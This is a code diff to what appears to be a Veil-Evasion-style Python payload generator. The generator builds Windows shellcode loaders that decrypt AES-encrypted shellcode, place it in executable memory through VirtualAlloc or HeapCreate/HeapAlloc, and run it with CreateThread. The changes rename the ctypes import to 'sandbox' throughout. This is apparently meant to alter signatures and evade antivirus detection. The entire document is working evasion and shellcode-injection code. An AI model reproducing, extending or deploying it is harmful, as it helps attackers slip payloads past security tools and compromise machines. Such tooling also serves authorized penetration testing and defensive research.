@@ -148,7 +148,7 @@ class Payload:
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
 
                 # Create Payload code
-                PayloadCode =  'import ctypes\n'
+                PayloadCode =  'import ctypes as sandbox\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
                 PayloadCode += 'import base64\n'
                 PayloadCode += 'import os\n'
@@ -187,11 +187,11 @@ class Payload:
                 PayloadCode += RandCipherObject + ' = AES.new('+ RandHttpKey +')\n'
                 PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                 PayloadCode += RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
-                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
-                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
-                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
-                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += RandPtr + ' = sandbox.windll.kernel32.VirtualAlloc(sandbox.c_int(0),sandbox.c_int(len(' + RandShellCode + ')),sandbox.c_int(0x3000),sandbox.c_int(0x40))\n'
+                PayloadCode += RandBuf + ' = (sandbox.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
+                PayloadCode += 'sandbox.windll.kernel32.RtlMoveMemory(sandbox.c_int(' + RandPtr + '),' + RandBuf + ',sandbox.c_int(len(' + RandShellCode + ')))\n'
+                PayloadCode += RandHt + ' = sandbox.windll.kernel32.CreateThread(sandbox.c_int(0),sandbox.c_int(0),sandbox.c_int(' + RandPtr + '),sandbox.c_int(0),sandbox.c_int(0),sandbox.pointer(sandbox.c_int(0)))\n'
+                PayloadCode += 'sandbox.windll.kernel32.WaitForSingleObject(sandbox.c_int(' + RandHt + '),sandbox.c_int(-1))\n'
 
                 if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
@@ -282,7 +282,7 @@ class Payload:
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
 
                 # Create Payload code
-                PayloadCode =  'import ctypes\n'
+                PayloadCode =  'import ctypes as sandbox\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
                 PayloadCode += 'import base64\n'
                 PayloadCode += 'import os\n'
@@ -321,12 +321,12 @@ class Payload:
                 PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                 PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                 PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
-                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
-                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
-                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
-                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
-                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+                PayloadCode += HeapVar + ' = sandbox.windll.kernel32.HeapCreate(sandbox.c_int(0x00040000),sandbox.c_int(len(' + ShellcodeVariableName + ') * 2),sandbox.c_int(0))\n'
+                PayloadCode += RandPtr + ' = sandbox.windll.kernel32.HeapAlloc(sandbox.c_int(' + HeapVar + '),sandbox.c_int(0x00000008),sandbox.c_int(len( ' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandBuf + ' = (sandbox.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += 'sandbox.windll.kernel32.RtlMoveMemory(sandbox.c_int(' + RandPtr + '),' + RandBuf + ',sandbox.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandHt + ' = sandbox.windll.kernel32.CreateThread(sandbox.c_int(0),sandbox.c_int(0),sandbox.c_int(' + RandPtr + '),sandbox.c_int(0),sandbox.c_int(0),sandbox.pointer(sandbox.c_int(0)))\n'
+                PayloadCode += 'sandbox.windll.kernel32.WaitForSingleObject(sandbox.c_int(' + RandHt + '),sandbox.c_int(-1))\n'
 
                 if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
